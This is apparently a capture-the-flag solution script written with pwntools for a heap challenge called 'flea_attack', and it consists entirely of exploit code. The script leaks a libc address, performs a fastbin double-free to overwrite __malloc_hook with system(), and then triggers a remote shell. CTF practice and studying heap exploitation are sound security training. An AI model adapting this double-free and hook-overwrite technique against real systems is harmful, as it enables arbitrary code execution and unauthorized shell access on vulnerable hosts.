from pwn import *

def add(size, name):
    r.sendline('1')
    r.sendlineafter(': ', str(size))
    r.sendlineafter(': ', name)
    r.recvuntil(': ')
    name = r.recvuntil(': ')
    addr = r.recvuntil('\n', drop=True)
    r.recvuntil('> ')
    return {'name': name, 'addr': int(addr, 16)}

def delete(addr):
    r.sendline('2')
    r.sendlineafter(': ', hex(addr)[2:])
    r.recvuntil('> ')

libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
r = remote('problem.harekaze.com', 20175)
# r = process('./flea_attack.elf')
# print 'pid :', pidof(r)

comment_addr = 0x204000
r.sendline('/bin/sh')

# leak
add(0x80, '')
addr = add(0x80, '')['addr']
add(0x80, '')

delete(addr)

name = add(0x80, '')['name']
leak = u64('\x00' + name[1:6] + '\x00\x00')

log.info('leak : ' + hex(leak))

libc.address = leak - 0x3c4b00
log.info('libc_base : ' + hex(libc.address))

# fastbin dup
a = add(0x60, p64(0))['addr']
b = add(0x60, p64(0))['addr']

log.info('delete : ' + hex(a))
log.info('delete : ' + hex(b))
log.info('delete : ' + hex(a))

delete(a)
delete(b)
delete(a)

target = libc.symbols['__malloc_hook'] - 0x23

log.info('target (__malloc_hook - 0x23) : ' + hex(target))

add(0x60, p64(target))
add(0x60, p64(0))
add(0x60, p64(0))

# write system's plt on __malloc_hook
payload  = '\x00' * 3
payload += p64(0) * 2
payload += p64(libc.symbols['system'])
add(0x60, payload)

# trigger
r.sendline('1')
r.sendline(str(comment_addr)) # &/bin/sh

r.interactive()
